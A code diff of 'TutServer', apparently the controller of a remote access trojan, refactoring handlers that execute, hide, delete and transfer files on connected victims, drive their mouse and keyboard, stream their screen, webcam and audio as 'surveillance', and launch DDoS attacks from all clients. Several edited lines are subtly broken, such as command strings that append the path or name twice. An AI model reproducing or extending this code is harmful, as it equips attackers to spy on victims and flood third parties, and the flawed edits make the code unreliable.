@@ -4450,8 +4417,7 @@ namespace TutServer //Main Namespace
         {
             if (listView3.SelectedItems.Count > 0) //If an item is selected
             {
-                String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full file path
-                xfer_path = path; //Store the full path
+                xfer_path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full file path
                 xfer_mode = xfer_copy; //Store the transfer mode
             }
         }
@@ -4463,7 +4429,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void currentDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            String cmd = "fpaste§" + Current_Path + "§" + xfer_path + "§" + xfer_mode; //Construct the command
+            string cmd = $"fpaste§{CurrentPath}§{xfer_path}§{xfer_mode}"; //Construct the command
             SendToTarget(cmd); //Send the command
             RefreshFiles(); //Refresh the file list
         }
@@ -4477,15 +4443,13 @@ namespace TutServer //Main Namespace
         {
             if (listView3.SelectedItems.Count > 0) //If an item is selected
             {
-                bool isDir = false; //Declare directory indicator variable
-                if (listView3.SelectedItems[0].SubItems[1].Text == "Directory") isDir = true; //If the item is a directory
-                if (!isDir) //If the items isn't the directory
+                if (listView3.SelectedItems[0].SubItems[1].Text != "Directory") //If the items isn't the directory
                 {
                     MessageBox.Show(this, "You can only paste a file into a directory", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
                     return; //Return
                 }
-                String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the directory
-                SendToTarget("fpaste§" + path + "§" + xfer_path + "§" + xfer_mode); //Send the command to the client
+                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the directory
+                SendToTarget($"fpaste§{path}§{xfer_path}§{xfer_mode}" + path + "§" + xfer_path + "§" + xfer_mode); //Send the command to the client
                 RefreshFiles(); //Refresh the file list
             }
         }
@@ -4499,8 +4463,8 @@ namespace TutServer //Main Namespace
         {
             if (listView3.SelectedItems.Count > 0) //If an item is selected
             {
-                String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the files full path
-                String command = "fexec§" + path; //Construct the command
+                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the files full path
+                string command = $"fexec§{path}"; //Construct the command
                 SendToTarget(command); //Send the command to the client
             }
         }
@@ -4514,8 +4478,8 @@ namespace TutServer //Main Namespace
         {
             if (listView3.SelectedItems.Count > 0) //If an item is selected
             {
-                String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
-                String command = "fhide§" + path; //Contruct the command
+                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
+                string command = $"fhide§{path}"; //Contruct the command
                 SendToTarget(command); //Send the command to the client
             }
         }
@@ -4529,8 +4493,8 @@ namespace TutServer //Main Namespace
         {
             if (listView3.SelectedItems.Count > 0) //If an item is selected
             {
-                String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
-                String command = "fshow§" + path; //Construct the command
+                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
+                string command = $"fshow§{path}"; //Construct the command
                 SendToTarget(command); //Send the command to the client
             }
         }
@@ -4544,8 +4508,8 @@ namespace TutServer //Main Namespace
         {
             if (listView3.SelectedItems.Count > 0) //If an item is selected
             {
-                String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
-                String command = "fdel§" + path; //Construct the command
+                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
+                string command = $"fdel§{path}" + path; //Construct the command
                 SendToTarget(command); //Send the command to the client
                 RefreshFiles(); //Refresh the file list
             }
@@ -4560,15 +4524,13 @@ namespace TutServer //Main Namespace
         {
             if (listView3.SelectedItems.Count > 0) //If an item is selected
             {
-                String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the item
-                String newName = ""; //Decalre the new name variable
-                bool validOperation = false; //Declare vaild Opreation flag
-                if (InputBox("Rename", "Please enter the new name of the file / directory!", ref newName) == DialogResult.OK) //Ask for the newName and if accepted
+                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the item
+                string newName = ""; //Decalre the new name variable
+                if (InputBox("Rename", "Please enter the new name of the file / directory!", ref newName) != DialogResult.OK) //Ask for the newName and if accepted
                 {
-                    validOperation = true; //Operation is valid
+                    return; // User denied to specify a new name
                 }
-                if (!validOperation) return; //Return if dialog is cancelled
-                String cmd = "frename§" + path + "§" + newName; //Construct the command
+                string cmd = $"frename§{path}§{newName}" + path + "§" + newName; //Construct the command
                 SendToTarget(cmd); //Send the command to the client
                 RefreshFiles(); //Refresh the file list
             }
@@ -4581,15 +4543,12 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void fileToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            String path = Current_Path; //Store the current path
-            String name = ""; //Declare the file name
-            bool validOperation = false; //Declare valid Operation flag
-            if (InputBox("New File", "Please enter the name and extension for the new file!", ref name) == DialogResult.OK) //Ask for the new name and if accepted
+            string name = ""; //Declare the file name
+            if (InputBox("New File", "Please enter the name and extension for the new file!", ref name) != DialogResult.OK) //Ask for the new name and if accepted
             {
-                validOperation = true; //Operation is valid
+                return; // User cancelled the prompt
             }
-            if (!validOperation) return; //If user cancelled the dialog
-            String command = "ffile§" + path + "§" + name; //Construct the command
+            string command = $"ffile§{CurrentPath}§{name}"; //Construct the command
             SendToTarget(command); //Send the command to the client
             RefreshFiles(); //Refresh the file list
         }
@@ -4601,15 +4560,12 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void directoryToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            String path = Current_Path; //Store the current path
-            String name = ""; //Declare directory name
-            bool validOperation = false; //Declare valid Operation flag
-            if (InputBox("New Directory", "Please enter the name for the new directory!", ref name) == DialogResult.OK) //Ask for the new name and if accepted
+            string name = ""; //Declare directory name
+            if (InputBox("New Directory", "Please enter the name for the new directory!", ref name) != DialogResult.OK) //Ask for the new name and if accepted
             {
-                validOperation = true; //Operation is valid
+                return; // User cancelled the operation
             }
-            if (!validOperation) return; //If the user pressed cancel
-            String command = "fndir§" + path + "§" + name; //Construct the command
+            string command = $"fndir§{CurrentPath}§{name}"; //Construct the command
             SendToTarget(command); //Send the command to the client
             RefreshFiles(); //Refresh the file list
         }
@@ -4623,14 +4579,12 @@ namespace TutServer //Main Namespace
         {
             if (listView3.SelectedItems.Count > 0) //if an item is selected
             {
-                String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the item
-                bool validOperation = false; //Declare valid operation flag
+                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the item
                 if (listView3.SelectedItems[0].SubItems[1].Text != "Directory") //If item isn't a directory
                 {
-                    validOperation = true; //Operation is valid
+                    return; // The user cancelled the operation
                 }
-                if (!validOperation) return; //User selected a directory
-                String cmd = "getfile§" + path; //Construct the command
+                string cmd = $"getfile§{path}"; //Construct the command
                 edit_content = path; //Store the path of the edited file
                 SendToTarget(cmd); //Send the command to the client
             }
@@ -4643,12 +4597,14 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void currentDirectoryToolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            String dir = Current_Path; //Store the current path
-            String file = ""; //Declatre the file name
+            string dir = CurrentPath; //Store the current path
+            string file = ""; //Declatre the file name
             OpenFileDialog ofd = new OpenFileDialog(); //Create new file selector
             if (ofd.ShowDialog() == DialogResult.OK) file = ofd.FileName; //Get the selected file
-            dir += "\\" + new FileInfo(file).Name; //Construct the new file path
-            String cmd = "fup§" + dir + "§" + new FileInfo(file).Length; //Construct the command
+            else return; // User didn't select a file to upload
+            FileInfo fileInfo = new FileInfo(file);
+            dir += "\\" + fileInfo.Name; //Construct the new file path
+            string cmd = $"fup§{dir}§{fileInfo.Length}"; //Construct the command
             fup_local_path = file; //Store the local file path for uploading
             SendToTarget(cmd); //Send the command to the client
         }
@@ -4662,12 +4618,14 @@ namespace TutServer //Main Namespace
         {
             if (listView3.SelectedItems.Count > 0) //If an item is selected
             {
-                String dir = listView3.SelectedItems[0].SubItems[3].Text; //Get the items full path
-                String file = ""; //Declare file path
+                string dir = listView3.SelectedItems[0].SubItems[3].Text; //Get the items full path
+                string file = ""; //Declare file path
                 OpenFileDialog ofd = new OpenFileDialog(); //Create new file selector
                 if (ofd.ShowDialog() == DialogResult.OK) file = ofd.FileName; //Get the local file path
-                dir += "\\" + new FileInfo(file).Name; //Construct the remote file path
-                String cmd = "fup§" + dir + "§" + new FileInfo(file).Length; //Construct the command
+                else return; // User didn't select the file to save to
+                FileInfo fileInfo = new FileInfo(file);
+                dir += "\\" + fileInfo.Name; //Construct the remote file path
+                string cmd = $"fup§{dir}§{fileInfo.Length}"; //Construct the command
                 fup_local_path = file; //Set the local file path to upload
                 SendToTarget(cmd); //Send the command to the client
             }
@@ -4683,8 +4641,8 @@ namespace TutServer //Main Namespace
             if (listView3.SelectedItems.Count > 0) //If an item is selected
             {
                 if (listView3.SelectedItems[0].SubItems[1].Text == "Directory") return; //If user selected a directory return
-                String dir = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
-                String cmd = "fdl§" + dir; //Construct the command
+                string remoteFile = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
+                string cmd = $"fdl§{remoteFile}"; //Construct the command
                 SaveFileDialog sfd = new SaveFileDialog
                 {
                     FileName = listView3.SelectedItems[0].SubItems[0].Text //Set the default file name
@@ -4752,13 +4710,11 @@ namespace TutServer //Main Namespace
 
             if (cmboChooseScreen.SelectedItem != null) //If a screen number is selected
             {
-                SendToTarget("screenNum" + cmboChooseScreen.SelectedItem.ToString()); //Set the screen on the remote client
+                SendToTarget($"screenNum{cmboChooseScreen.SelectedItem.ToString()}"); //Set the screen on the remote client
             }
             System.Threading.Thread.Sleep(1500); //Wait for the client
-            // _multiRecv = true;
             MultiRecv = true; //Set multiRevc since this is a surveillance module
             RDesktop = true; //Enable the remote desktop flag
-            // _rdesktop = true;
             SendToTarget("rdstart"); //Send the command to the client
         }
 
@@ -4783,15 +4739,9 @@ namespace TutServer //Main Namespace
             checkBoxrKeyboard.Checked = false; //Disable remote keyboard
 
             RDesktop = false; //Disable the remote desktop flag
-
-            if (!AuStream && !WStream) //If no audio and web cam stream
-            {
-                MultiRecv = false; //Disable the MultiRecv flag, since no surveillance module is running
-               // _rdesktop = false;
-                IsRdFull = false; //Disable the full screen flag
-               // _isrdFull = false;
-                sCore.UI.CommonControls.remoteDesktopPictureBox = null; //Remove the full screen picture box reference from the plugins
-            }
+            MultiRecv = AuStream || WStream; // Set the multi recv flag
+            IsRdFull = false; //Disable the full screen flag
+            sCore.UI.CommonControls.remoteDesktopPictureBox = null; //Remove the full screen picture box reference from the plugins
 
             try
             {
@@ -4840,7 +4790,8 @@ namespace TutServer //Main Namespace
                     {
                         if (plx != e.X || ply != e.Y) //Compare with the previous values and if mouse moved then
                         {
-                            rMoveCommands.Add("rmove-" + mx + ":" + my); //Add mouse movement to the command list
+                            // TODO: post command from here, remove the timer
+                            rMoveCommands.Add($"rmove-{mx}:{my}"); //Add mouse movement to the command list
                             plx = e.X; //Set the last X position to the current one
                             ply = e.Y; //Set the last Y position to the current one
 
@@ -4917,7 +4868,6 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
         {
-
             if (rmouse == 1) //If remote mouse if enabled
             {
                 if (e.Button == MouseButtons.Left) //If left button is clicked
@@ -4938,6 +4888,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
         {
+            // TODO: send the code of the click to avoid conversion at the client side
             if (rmouse == 1) //If remote mouse is enabled
             {
                 if (e.Button == MouseButtons.Left) //If left button clicked
@@ -4980,8 +4931,6 @@ namespace TutServer //Main Namespace
             Rdxref = full; //Set the reference
             sCore.UI.CommonControls.remoteDesktopPictureBox = (PictureBox)full.Controls.Find("pictureBox1", true)[0]; //Set the remote desktop screen for plugins
             IsRdFull = true; //Set the full screen flag
-           
-           // _isrdFull = true;
         }
 
         /// <summary>
@@ -5012,18 +4961,17 @@ namespace TutServer //Main Namespace
                     astream.Init(); //Init the playback object
                     SendToTarget("astream§" + deviceNumber.ToString()); //Send the command to the client
                     button25.Text = "Stop Stream"; //Update UI
-                    return; //Return
                 }
-
-                if (AuStream) //If audio stream is running
+                else //If audio stream is running
                 {
                     SendToTarget("astop"); //Send command to client
-                    if (!RDesktop && !WStream) //If no remote desktop or web cam stream is running
-                    {
-                        Application.DoEvents(); //Do the events
-                        System.Threading.Thread.Sleep(1500); //Wait for the client to stop streaming
-                        MultiRecv = false; //Set multiRecv to false since no surveillance stream is running
-                    }
+                    //if (!RDesktop && !WStream) //If no remote desktop or web cam stream is running
+                    //{
+                    //    Application.DoEvents(); //Do the events
+                    //    System.Threading.Thread.Sleep(1500); //Wait for the client to stop streaming
+                    //    MultiRecv = false; //Set multiRecv to false since no surveillance stream is running
+                    //}
+                    MultiRecv = WStream || RDesktop; // Set the multiRecv flag
                     AuStream = false; //Disable the audioStream flag
                     astream.Destroy(); //Destroy the playback object
                     astream = null; //Remvove references to the playback object
@@ -5051,25 +4999,25 @@ namespace TutServer //Main Namespace
         {
             if (!WStream && listView5.SelectedItems.Count > 0) //If an item is selected and web cam is not streaming
             {
-                String id = listView5.SelectedItems[0].SubItems[0].Text; //Get the ID of the device
-                String command = "wstream§" + id; //Construct the command
+                string id = listView5.SelectedItems[0].SubItems[0].Text; //Get the ID of the device
+                string command = $"wstream§{id}"; //Construct the command
                 MultiRecv = true; //Set the multiRecv flag since web cam is a surveillance stream
                 WStream = true; //Set the web cam stream flag
                 button27.Text = "Stop stream"; //Update the UI
                 SendToTarget(command); //Send the command to the client
                 return; //Return
             }
-
-            if (WStream) //If web cam is streaming
+            else if (WStream) //If web cam is streaming
             {
                 SendToTarget("wstop"); //Send the command to the client
 
-                if (!RDesktop && !AuStream) //If remote desktop and audio stream isn't running
-                {
-                    Application.DoEvents(); //Do the events
-                    System.Threading.Thread.Sleep(1500); //Wait for the client to stop the stream
-                    MultiRecv = false; //Disable the multiRecv flag since no surveillance stream is running
-                }
+                //if (!RDesktop && !AuStream) //If remote desktop and audio stream isn't running
+                //{
+                //    Application.DoEvents(); //Do the events
+                //    System.Threading.Thread.Sleep(1500); //Wait for the client to stop the stream
+                //    MultiRecv = false; //Disable the multiRecv flag since no surveillance stream is running
+                //}
+                MultiRecv = RDesktop || AuStream;
                 WStream = false; //Disable the web cam stream flag
                 button27.Text = "Start Stream"; //Update the UI
             }
@@ -5082,11 +5030,9 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button29_Click(object sender, EventArgs e)
         {
-            if (textBox6.Text == "" || comboBox5.SelectedItem == null) return; //If no protocol or no IP is set then return
-            String ip = textBox6.Text; //Store the remote IP
-            String prot = comboBox5.SelectedItem.ToString(); //Store the DDoS protocol
+            if (textBox6.Text == "" || comboBox5.SelectedItem == null) return; //If no IP or no protocol is set then return
 
-            TestDDoS(ip, prot); //Test the DDoS target
+            TestDDoS(textBox6.Text, comboBox5.SelectedItem.ToString()); //Test the DDoS target
         }
 
         /// <summary>
@@ -5097,12 +5043,12 @@ namespace TutServer //Main Namespace
         private void button28_Click(object sender, EventArgs e)
         {
             bool isAllClient = checkBox3.Checked; //Attack with all connected clients?
-            String ip = textBox6.Text; //The IP of the target
-            String port = numericUpDown1.Value.ToString(); //The port to attack on
-            String protocol = comboBox5.SelectedItem.ToString(); //The protocol to use
-            String packetSize = numericUpDown2.Value.ToString(); //The size of each packet sent
-            String threads = numericUpDown3.Value.ToString(); //How many threads to use per client
-            String delay = numericUpDown4.Value.ToString(); //How much to wait before sending the next packet
+            string ip = textBox6.Text; //The IP of the target
+            string port = numericUpDown1.Value.ToString(); //The port to attack on
+            string protocol = comboBox5.SelectedItem.ToString(); //The protocol to use
+            string packetSize = numericUpDown2.Value.ToString(); //The size of each packet sent
+            string threads = numericUpDown3.Value.ToString(); //How many threads to use per client
+            string delay = numericUpDown4.Value.ToString(); //How much to wait before sending the next packet
             StartDDoS(ip, port, protocol, packetSize, threads, delay, isAllClient); //Start the Attack
         }
 
@@ -5113,7 +5059,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button30_Click(object sender, EventArgs e)
         {
-            String command = "ddosk"; //Construct the command
+            const string command = "ddosk"; //Construct the command
             int count = 0; //Declare index variable
             foreach (Socket s in _clientSockets) //Go through all connected clients
             {
@@ -5196,10 +5142,8 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void txtBControlKeyboard_KeyDown(object sender, KeyEventArgs e)
         {
-
             if (rkeyboard == 1) //If we can control the keyboard
             {
-
                 string keysToSend = ""; //Declare the keys to send
 
                 //Handle the modifier keys
@@ -5212,27 +5156,19 @@ namespace TutServer //Main Namespace
 
                 if (Console.CapsLock == true) //If CapsLock is enabled
                 {
-
                     if (e.KeyValue >= 65 && e.KeyValue <= 90) //If the keys fall in this range
                     {
                         keysToSend += e.KeyCode.ToString().ToLower(); //Convert them to lower case
                     }
-
-
                 }
 
                 if (Console.CapsLock == false) //If CapsLock is disabled
                 {
-
                     if (e.KeyValue >= 65 && e.KeyValue <= 90) //If the keys fall in this range, convert them to upper case
                     {
                         keysToSend += e.KeyCode.ToString().ToUpper();
                     }
-
                 }
-
-                //if (e.KeyValue >= 65 && e.KeyValue <= 90)
-                //    keysToSend += e.KeyCode.ToString().ToLower();
 
                 //Handle Special Characters
 
@@ -5351,13 +5287,7 @@ namespace TutServer //Main Namespace
                 else if (e.KeyValue == 243)
                     keysToSend += "ó";
 
-
-
-
-                // parent.loopSend("rtype-" + keysToSend);
-
-                //Send the command to the remote client
-                SendToTarget("rtype-" + keysToSend);
+                SendToTarget($"rtype-{keysToSend}");
 
             }
             txtBControlKeyboard.Clear(); //Clear the control
@@ -5400,7 +5330,7 @@ namespace TutServer //Main Namespace
                 return; //Return
             }
             string strClient = listView1.SelectedItems[0].SubItems[0].Text; //Get the selected client's ID
-            strClient = strClient.Replace("Client ", String.Empty); //Remove the client part
+            strClient = strClient.Replace("Client ", string.Empty); //Remove the client part
             int clientID = int.Parse(strClient); //Parse the ID to an integer
             if (lcm != null) //If linux client manager is enabled
             {
@@ -5410,7 +5340,7 @@ namespace TutServer //Main Namespace
 
             //Write data to label2 (Client Information)
 
-            label2.Text = "Client Type: " + clientType;
+            label2.Text = $"Client Type: {clientType}";
         }
 
         /// <summary>
@@ -5430,7 +5360,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button34_Click(object sender, EventArgs e)
         {
-            string cmd = "startipc§tut_client_proxy"; //Construct the command
+            const string cmd = "startipc§tut_client_proxy"; //Construct the command
             RemotePipe rp = new RemotePipe("tut_client_proxy", this); //Create a new remote pipe
             SendToTarget(cmd); //Send the command oto the client
             sCore.RAT.ExternalApps.AddIPCConnection(hostToken, new KeyValuePair<string, RichTextBox>("tut_client_proxy", rp.outputBox)); //Broadcast the IPC connection to the plugins
@@ -5448,15 +5378,14 @@ namespace TutServer //Main Namespace
             if (listBox1.SelectedItem != null) //If an item is selected
             {
                 string plugin = listBox1.SelectedItem.ToString(); //Get the name of the plugin
-                object[] pInfo = sh.GetPluginInfo(plugin); //Get the plugin information
-                label29.Text = "Name: " + pInfo[0].ToString(); //Set the name
-                label30.Text = "Version: " + pInfo[1].ToString(); //Set the version
-                label31.Text = "Author: " + pInfo[4].ToString(); //Set the author's name
-                label32.Text = "Description: " + pInfo[2].ToString(); //Set the description
+                IPluginMain pInfo = sh.GetPluginInfo(plugin); //Get the plugin information
+                label29.Text = $"Name: {pInfo.ScriptName}"; //Set the name
+                label30.Text = $"Version: {pInfo.Scriptversion}"; //Set the version
+                label31.Text = $"Author: {pInfo.AuthorName}" + pInfo.AuthorName; //Set the author's name
+                label32.Text = $"Description: {pInfo.ScriptDescription}"; //Set the description
                 comboBox6.Items.Clear(); //Clear the permission box
 
-                Permissions[] ps = (Permissions[])pInfo[3]; //Get the permissions
-                foreach (Permissions p in ps) //Go through the permissions
+                foreach (Permissions p in pInfo.ScriptPermissions) //Go through the permissions
                 {
                     comboBox6.Items.Add(p.ToString()); //Add the permission to the list
                 }
@@ -5498,6 +5427,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button38_Click(object sender, EventArgs e)
         {
+            // TODO: i'm sure we can somehow reload the list without interfering with running plugins
             if (sh.runningPlugins.Count > 0)
             {
                 MessageBox.Show(this, "There are running plugins, you can't currently refresh the plugin list", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
@@ -5524,7 +5454,7 @@ namespace TutServer //Main Namespace
         {
             if (listBox1.SelectedItem != null) //If an item is seleted
             {
-                //Should implement this to ScriptHost itself!
+                // TODO: Should implement this to ScriptHost itself!
                 string scriptName = listBox1.SelectedItem.ToString(); //Get the plugin's file name
                 //if (sh.IsPluginRunning(scriptName)) //Stop plugin
                 File.Delete(Application.StartupPath + "\\scripts\\" + scriptName); //Delete the plugin
@@ -5591,7 +5521,7 @@ namespace TutServer //Main Namespace
                 return; //Return
             }
 
-            SendToTarget("sprobe§" + comboBox7.SelectedItem); //Send the command to the client
+            SendToTarget($"sprobe§{comboBox7.SelectedItem}"); //Send the command to the client
         }
 
         /// <summary>
